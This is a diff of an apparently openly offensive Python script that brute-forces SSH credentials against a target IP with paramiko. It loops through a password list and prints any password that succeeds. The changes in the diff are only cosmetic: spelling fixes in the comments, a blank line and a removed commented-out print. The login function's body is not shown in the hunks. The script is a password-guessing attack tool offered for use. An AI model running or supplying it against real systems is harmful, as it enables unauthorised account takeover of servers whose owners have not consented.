@@ -1,13 +1,13 @@
 ####################
 #Brute Force SSH creds
 #
-#This script will require a target IP, username and password list. 
-#This script will need root privileges to run succesfully.
+#This script will require a target IP, username, and password list. 
+#This script will need root privileges to run successfully.
 ####################
 
 import paramiko
 host = "target_ip" # enter target IP address here.
-user = "username" # enter the username to brute force the password.
+user = "username" # Enter the username to brute force the password.
 def sshbrute(loginPass):
    
  
@@ -22,9 +22,9 @@ def sshbrute(loginPass):
 loginPasslist = []
 with open("pass.txt", "r") as f:    #replace your "pass.txt" with your password list.
     loginPasslist = [line.strip() for line in f.readlines()]
+
 print(f"Brute forcing the ssh service at {host} now...")
 for passwd in loginPasslist:
-    #print(passwd)
     found_password = sshbrute(passwd)
     if found_password:
         print(f"The password for the user {user} at ip {host} is: {found_password}")
